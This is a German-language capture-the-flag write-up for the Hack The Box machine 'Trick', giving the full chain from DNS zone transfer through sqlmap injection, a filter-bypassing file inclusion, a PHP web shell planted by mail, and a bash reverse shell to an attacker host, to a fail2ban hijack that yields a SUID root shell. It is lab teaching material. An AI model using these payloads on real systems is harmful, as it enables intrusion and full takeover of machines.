---
tags: [htb, linux, easy, writeup]
cve: CVE-2022-28468
techniques: [zone-transfer, sqli, lfi, mail-poisoning, fail2ban, suid]
---
# Trick (HTB)

| Feld               | Wert            |
| ------------------ | --------------- |
| OS                 | Linux           |
| Difficulty         | Easy            |
| Box IP             | `10.129.2.82`   |
| Attacker IP (tun0) | `<attacker-ip>` |

> [!info] Kill Chain
> [[Zone Transfer]] → vHost → [[SQL Injection|SQLi]] (File Read) → nginx-Config → 2. vHost mit [[Local File Inclusion|LFI]] → [[Mail and Log Poisoning]] (RCE) → [[fail2ban Abuse]] → [[SUID Abuse|SUID]] → **root**

---

# 1 · Enumeration

## Zone Transfer → [[Zone Transfer]]
- `nmap -sCV 10.129.2.82` → `53/tcp open domain` => Zone Transfer testen
```bash
dig axfr trick.htb @10.129.2.82
# => preprod-payroll.trick.htb   (erster vHost)
```
- Zone Transfer (`axfr`) = Abfrage aller Einträge einer DNS-Zone. Eigentlich nur zwischen DNS-Servern vorgesehen → bei Fehlkonfiguration für jeden abrufbar. Damit lassen sich verborgene Subdomains/vHosts finden
- In `/etc/hosts` aufnehmen zur Auflösung der DNS
	- nötig, da der eigene Rechner `trick.htb` sonst nicht auflöst. `/etc/hosts` = lokale „Name → IP"-Zuordnung, die dem DNS vorgeht
```bash
sudo nano /etc/hosts
# 10.129.2.82  trick.htb preprod-payroll.trick.htb
curl http://preprod-payroll.trick.htb | grep -i title
# => Payroll Management System
```

---

# 2 · Foothold

## 2.1 SQLi → [[SQL Injection]]
- Login-Request abfangen (DevTools → *Copy Request Headers*)
- Body ergänzen (`username=jn&password=na`)
- als `trick_req.txt` speichern:
```http
POST /ajax.php?action=login HTTP/1.1
Host: preprod-payroll.trick.htb
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: PHPSESSID=alksf2i0267tg0rg4rbn76usc5

username=jn&password=na
```
```bash
sqlmap -r trick_req.txt --batch --dbs
# => username verwundbar (time-based blind, MariaDB)
# => DBs: information_schema, payroll_db
```
- der komplette Request wird als Datei gespeichert und `sqlmap` per `-r` übergeben → Header und Cookie müssen nicht einzeln angegeben werden. `--batch` = sqlmap verwendet ohne Rückfrage die Standardantworten
- „time-based blind" = die Anwendung liefert keine sichtbaren Fehler, die Auswertung erfolgt über die **Antwortzeit** (z. B. `SLEEP(5)` → 5 s Verzögerung = Bedingung wahr). Langsam, aber zuverlässig

## 2.2 FILE-Recht → nginx-Config
```bash
sqlmap -r trick_req.txt --batch --is-dba --privileges   # => FILE ✅
sqlmap -r trick_req.txt --batch --threads=10 \
  --file-read=/etc/nginx/sites-enabled/default
```
- `FILE`-Privileg = die Datenbank darf Dateien vom Server lesen → über die SQLi lassen sich nicht nur DB-Inhalte, sondern auch **Systemdateien** auslesen
- die nginx-Config ist relevant, weil sie alle vom Webserver bedienten vHosts enthält – auch solche ohne DNS-Eintrag
Config enthält 3 `server_name` → neuer vHost:

| server_name                   | root               |
| ----------------------------- | ------------------ |
| `trick.htb`                   | `/var/www/html`    |
| `preprod-payroll.trick.htb`   | `/var/www/payroll` |
| `preprod-marketing.trick.htb` | `/var/www/market`  |

=> `preprod-marketing.trick.htb` in `/etc/hosts` eintragen.

> [!note] DNS ≠ nginx
> Zone Transfer zeigt nur, was der **DNS** kennt. `preprod-marketing` hat keinen DNS-Eintrag → nur über die nginx-Config auffindbar. Das wird meist für interne Webserver-Kommunikation verwendet

## 2.3 LFI → [[Local File Inclusion]]
`?page=` lädt Dateien → `/etc/passwd` lesen:
```bash
curl "http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//etc/passwd" | grep 1001
# michael:x:1001:1001::/home/michael:/bin/bash
```
=> User mit UID 1001 = **`michael`** (`....//` = Nested Traversal gegen den Filter)
- `?page=` bindet eine Datei in die Seite ein. Wird statt eines Seitennamens ein Pfad wie `../../etc/passwd` übergeben, lassen sich fremde Dateien lesen = LFI
- `....//` statt `../`: die Anwendung entfernt `../`. Streicht sie aus `....//` die mittlere Sequenz, bleibt erneut `../` übrig → Filter umgangen

## 2.4 LFI → [[Mail and Log Poisoning]] -> RCE
**(1)** PHP-Payload per Mail einschleusen (SMTP 25):
```bash
printf 'HELO trick.htb\nMAIL FROM:<a@trick.htb>\nRCPT TO:<michael@localhost>\nDATA\nSubject: pwn\n\n<?php system($_GET["cmd"]); ?>\n.\nQUIT\n' | nc 10.129.2.82 25
```
> [!warning] `454 Relay access denied`
> Nur `michael@localhost` / `@debian.localdomain` akzeptiert, nicht `@trick.htb`.

- gleiches Prinzip wie bei Reset, nur über Mail statt Log: an michael wird eine Mail mit PHP-Code im Inhalt gesendet, die in `/var/mail/michael` abgelegt wird
- anschließend wird die Mail-Datei per LFI eingebunden → PHP führt den Code aus. `nc ... 25` = direkte Kommunikation mit dem SMTP-Server, die Mail wird Zeile für Zeile übergeben

**(2)** Mail via LFI einbinden + Befehl:
```bash
curl "http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//var/mail/michael&cmd=id"
# uid=1001(michael) ... groups=1001(michael),1002(security)   <- security merken!
```

## 2.5 User-Flag
```bash
curl -G "http://preprod-marketing.trick.htb/index.php" \
  --data-urlencode "page=....//....//....//....//....//var/mail/michael" \
  --data-urlencode "cmd=cat /home/michael/user.txt"
# => 32 hex
```

---

# 3 · Privilege Escalation → [[fail2ban Abuse]]

## 3.1 sudo-Rechte des Users checken
```bash
# ...&cmd=sudo%20-l
(root) NOPASSWD: /etc/init.d/fail2ban restart
```
=> Lücke = `security`-Gruppe + passwortloser fail2ban-Restart.
- Prinzip: fail2ban läuft als **root** und führt bei einem Ban eine „action"-Datei aus. Durch Schreibrecht auf diese Datei (via `security`-Gruppe) und den passwortlosen Neustart (NOPASSWD) lässt sich ein eigener Befehl einschleusen, der als root ausgeführt wird

## 3.2 Reverse Shell aufbauen → [[Reverse Shell]]
```bash
# Terminal 1
nc -lvnp 4444
# Terminal 2
curl -G "http://preprod-marketing.trick.htb/index.php" \
  --data-urlencode "page=....//....//....//....//....//var/mail/michael" \
  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1'"
```
Shell-Upgrade: `python3 -c 'import pty;pty.spawn("/bin/bash")'` → `Strg+Z` → `stty raw -echo; fg` → `export TERM=xterm`
- Grund für die Reverse Shell: über den `cmd=`-curl ist kaum interaktives Arbeiten möglich (Dateien erstellen, `cd`, Tab-Vervollständigung). Eine echte Shell erleichtert die weiteren Schritte erheblich
- das Upgrade verwandelt die eingeschränkte Shell in eine vollwertige (Pfeiltasten, `Strg+C` beendet nicht die gesamte Shell usw.)

## 3.3 Action-Datei kapern → [[fail2ban Abuse]] (mit [[SUID Abuse]])
```bash
ls -la /etc/fail2ban/action.d/
# drwxrwx--- root security   <- michael (security) darf im Ordner schreiben
```
- `drwxrwx---` + Gruppe `security`: Schreibrecht auf das **Verzeichnis** (Dateien anlegen/umbenennen), die vorhandene Datei gehört jedoch root → direktes Überschreiben nicht möglich
- daher: die alte Datei umbenennen (Verzeichnis-Operation, erlaubt) und eine neue gleichnamige anlegen (ebenfalls erlaubt) → die eigene Version ist aktiv
```bash
cd /etc/fail2ban/action.d/
mv iptables-multiport.conf iptables-multiport.conf.bak   # umbenennen (Datei-Recht fehlt)
cat > iptables-multiport.conf << 'EOF'
[Definition]
actionstart =
actionstop =
actioncheck =
actionban = cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash
actionunban =
EOF
sudo /etc/init.d/fail2ban restart
```
- `actionban` = der Befehl, den fail2ban (als root) bei einem Ban ausführt. Hier eingetragen: bash nach `/tmp` kopieren und das SUID-Bit setzen
- SUID (`4755`): wer die Datei ausführt, läuft mit den Rechten des **Besitzers** (hier root), nicht mit den eigenen → die Kopie wird zur Root-Shell
- `restart` lädt die manipulierte action-Datei neu ein
> [!danger] `chmod +s` reicht NICHT
> `+s` → `-rws--S---` (kein `x` für Gruppe/Andere) → `Permission denied`.
> `chmod 4755` → `-rwsr-xr-x` → ausführbar.

## 3.4 Ban auslösen + Root
```bash
# von Kali: fehlgeschlagene SSH-Logins => Ban
for i in $(seq 1 10); do ssh -o StrictHostKeyChecking=no -o PubkeyAuthentication=no bad@10.129.2.82; done
```
- der Ban muss nun ausgelöst werden: fail2ban sperrt nach mehreren fehlgeschlagenen SSH-Logins → gezielt falsche Logins erzeugen
- Ban wird ausgelöst → `actionban` läuft als root → `/tmp/rootbash` entsteht mit SUID. `-p` beim Start verhindert, dass die Root-Rechte sofort verworfen werden
```bash
ls -la /tmp/rootbash        # -rwsr-xr-x root root
/tmp/rootbash -p            # -p = root-Rechte behalten
id                          # euid=0(root) ✅
cat /root/root.txt          # => 32 hex
```
